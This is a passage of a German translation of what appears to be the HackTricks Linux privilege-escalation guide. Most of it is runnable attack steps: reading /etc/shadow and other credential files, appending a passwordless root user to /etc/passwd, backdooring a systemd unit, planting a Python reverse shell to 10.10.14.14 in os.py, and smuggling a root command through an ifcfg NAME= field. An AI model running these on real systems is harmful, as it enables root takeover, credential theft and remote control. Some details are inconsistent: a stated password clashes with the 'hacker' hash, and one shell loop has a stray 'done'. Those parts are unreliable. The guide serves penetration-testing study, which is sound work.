Dieser Fehler tritt beim Erstellen eines neuen ssh-Schlüssels in diesen OS auf, da **nur 32,768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **wenn man den ssh-public key hat, kann man nach dem entsprechenden private key suchen**. Die berechneten Möglichkeiten findest du hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante Konfigurationswerte

- **PasswordAuthentication:** Gibt an, ob Passwort-Authentifizierung erlaubt ist. Der Standard ist `no`.
- **PubkeyAuthentication:** Gibt an, ob Public-Key-Authentifizierung erlaubt ist. Der Standard ist `yes`.
- **PermitEmptyPasswords**: Wenn Passwort-Authentifizierung erlaubt ist, legt es fest, ob der Server Anmeldungen zu Accounts mit leeren Passwortstrings zulässt. Der Standard ist `no`.

### PermitRootLogin

Legt fest, ob root sich per ssh anmelden kann, Standard ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und private key anmelden
- `without-password` or `prohibit-password`: root kann sich nur mit einem private key anmelden
- `forced-commands-only`: Root kann sich nur mit private key anmelden und nur wenn die command-Optionen angegeben sind
- `no` : nein

### AuthorizedKeysFile

Legt Dateien fest, die die public keys enthalten, die zur Benutzer-Authentifizierung verwendet werden können. Sie kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Du kannst absolute Pfade angeben** (beginnend mit `/`) oder **relative Pfade vom Home des Benutzers aus**. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration zeigt an, dass, wenn du versuchst, dich mit dem **private** key des Benutzers "**testusername**" einzuloggen, ssh den public key deines Schlüssels mit denen in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleichen wird

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding erlaubt es dir, **use your local SSH keys instead of leaving keys** (without passphrases!) auf deinem Server zu belassen. So wirst du in der Lage sein, via ssh **jump** **to a host** und von dort **jump to another** host **using** den **key** auf deinem **initial host** zu nutzen.

Du musst diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass wenn `Host` auf `*` gesetzt ist, jedes Mal, wenn der Benutzer zu einer anderen Maschine springt, dieser Host Zugriff auf die keys hat (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann ssh-agent forwarding mit dem Schlüsselwort `AllowAgentForwarding` **erlauben** oder **verweigern** (Standard ist allow).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profil-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher, wenn du **eine von ihnen schreiben oder ändern kannst, kannst du escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein ungewöhnliches Profilskript gefunden wird, solltest du es auf **sensible Details** überprüfen.

### Passwd/Shadow Dateien

Je nach OS können die `/etc/passwd`- und `/etc/shadow`-Dateien einen anderen Namen haben oder es kann ein Backup existieren. Daher wird empfohlen, **alle zu finden** und **zu prüfen, ob du sie lesen kannst**, um zu sehen, **ob sich Hashes** in den Dateien befinden:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In einigen Fällen kann man **password hashes** in der Datei `/etc/passwd` (oder einer äquivalenten Datei) finden
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Schreibbares /etc/passwd

Generiere zuerst ein password mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Füge anschließend den Benutzer `hacker` hinzu und trage das generierte Passwort `s9V!rTq4#Xm2bK8z` ein.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst jetzt den Befehl `su` mit `hacker:hacker` verwenden

Alternativ kannst du die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Dadurch könnte die aktuelle Sicherheit der Maschine beeinträchtigt werden.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`, außerdem wurde `/etc/shadow` in `/etc/spwd.db` umbenannt.

Du solltest prüfen, ob du in einige **sensible Dateien** schreiben kannst. Zum Beispiel: Kannst du in eine **Service-Konfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel, wenn die Maschine einen **tomcat**-Server betreibt und Sie die **Tomcat-Service-Konfigurationsdatei innerhalb von /etc/systemd/,** ändern können, dann können Sie die Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Deine backdoor wird beim nächsten Start von tomcat ausgeführt.

### Check Folders

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich kannst du den letzten nicht lesen, aber versuche es.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ungewöhnlicher Speicherort/Owned Dateien
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binärdateien im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webdateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sicherungen**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die Passwörter enthalten

Sieh dir den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) an — er durchsucht nach **mehreren möglichen Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), eine Open-Source-Anwendung, die viele auf einem lokalen Computer gespeicherte Passwörter für Windows, Linux & Mac auslesen kann.

### Protokolle

Wenn du Logs lesen kannst, könntest du **interessante/vertrauliche Informationen darin finden**. Je merkwürdiger das Log ist, desto interessanter dürfte es (wahrscheinlich) sein.\
Außerdem können einige "**schlecht**" konfigurierte (backdoored?) **audit logs** es ermöglichen, Passwörter in Audit-Logs zu **protokollieren**, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um **Logs zu lesen**, ist die Gruppe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Du solltest außerdem nach Dateien suchen, die das Wort "**password**" im **Namen** oder im **Inhalt** enthalten, und auch nach IPs und emails in Logs oder nach hashes regexps.\
Ich werde hier nicht auflisten, wie man das alles macht, aber wenn du interessiert bist, kannst du die letzten checks anschauen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform.

## Schreibbare Dateien

### Python library hijacking

Wenn du weißt, von **wo** ein python-Skript ausgeführt wird und du in diesen Ordner schreiben kannst oder python libraries **modifizieren** kannst, kannst du die os library verändern und sie backdooren (wenn du dort schreiben kannst, wo das python-Skript ausgeführt wird, kopiere und füge die os.py library ein).

Um **backdoor the library** durchzuführen, füge einfach am Ende der os.py library die folgende Zeile hinzu (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Eine Schwachstelle in `logrotate` erlaubt Benutzern mit **Schreibrechten** auf eine Logdatei oder deren übergeordnete Verzeichnisse unter Umständen, erhöhte Privilegien zu erlangen. Das liegt daran, dass `logrotate`, das oft als **root** läuft, dazu gebracht werden kann, beliebige Dateien auszuführen — insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in jedem Verzeichnis, in dem Logrotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

Diese Schwachstelle ist sehr ähnlich zu [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** daher solltest du, wann immer du Logs verändern kannst, prüfen, wer diese Logs verwaltet und ob du durch Ersetzen der Logs mit Symlinks Privilegien eskalieren kannst.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus welchem Grund auch immer ein `ifcf-<whatever>` Script nach _/etc/sysconfig/network-scripts_ **schreiben** kann **oder** ein vorhandenes Skript **anpassen** kann, dann ist dein **system is pwned**.

Network scripts, _ifcg-eth0_ zum Beispiel, werden für Netzwerkverbindungen verwendet. Sie sehen genau wie .INI Dateien aus. Allerdings werden sie auf Linux von Network Manager (dispatcher.d) ~sourced~.

In meinem Fall wird das Attribut `NAME=` in diesen Network Scripts nicht korrekt verarbeitet. Wenn der Name ein Leerzeichen enthält, versucht das System, den Teil nach dem Leerzeichen auszuführen. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Beachte das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd und rc.d**

Das Verzeichnis `/etc/init.d` ist die Heimat für **Skripte** für System V init (SysVinit), das **klassische Linux-Service-Management-System**. Es enthält Skripte zum `start`, `stop`, `restart` und manchmal `reload` von Diensten. Diese können direkt ausgeführt werden oder über symbolische Links in `/etc/rc?.d/`. Ein alternativer Pfad bei Redhat-Systemen ist `/etc/rc.d/init.d`.

Auf der anderen Seite ist `/etc/init` mit **Upstart** verbunden, einem neueren **Service-Management**, das von Ubuntu eingeführt wurde und Konfigurationsdateien für Service-Aufgaben nutzt. Trotz des Übergangs zu Upstart werden SysVinit-Skripte weiterhin zusammen mit Upstart-Konfigurationen verwendet, aufgrund einer Kompatibilitätsschicht in Upstart.

**systemd** gilt als moderner Init- und Service-Manager und bietet erweiterte Funktionen wie bedarfsorientiertes Starten von Daemons, Automount-Management und Systemzustand-Snapshots. Es organisiert Dateien in `/usr/lib/systemd/` für Distributionspakete und `/etc/systemd/system/` für Administratoranpassungen und vereinfacht so die Systemverwaltung.

## Weitere Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hooken häufig einen syscall, um privilegierte Kernel-Funktionalität einem Userspace-Manager zugänglich zu machen. Schwache Manager-Authentifizierung (z. B. Signature-Checks basierend auf FD-order oder mangelhafte Passwortschemata) kann einer lokalen App ermöglichen, den Manager zu imitieren und auf bereits gerooteten Geräten zu root zu eskalieren. Mehr Informationen und Exploit-Details hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gesteuerte Service-Discovery in VMware Tools/Aria Operations kann einen Binary-Pfad aus Prozess-Command-Lines extrahieren und diesen mit -v in einem privilegierten Kontext ausführen. Freizügige Patterns (z. B. Verwendung von \S) können auf von Angreifern platzierten Listenern in beschreibbaren Verzeichnissen (z. B. /tmp/httpd) matchen und so zur Ausführung als root führen (CWE-426 Untrusted Search Path).

Mehr dazu und ein generalisiertes Muster, das auf andere Discovery-/Monitoring-Stacks anwendbar ist, hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel-Sicherheitsmaßnahmen

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Weitere Hilfe

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Bestes Tool, um Linux lokale privilege escalation-Vektoren zu finden:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeriert Kernel-Schwachstellen in Linux und macOS [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physischer Zugriff):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Sammlung weiterer Skripte**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referenzen

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
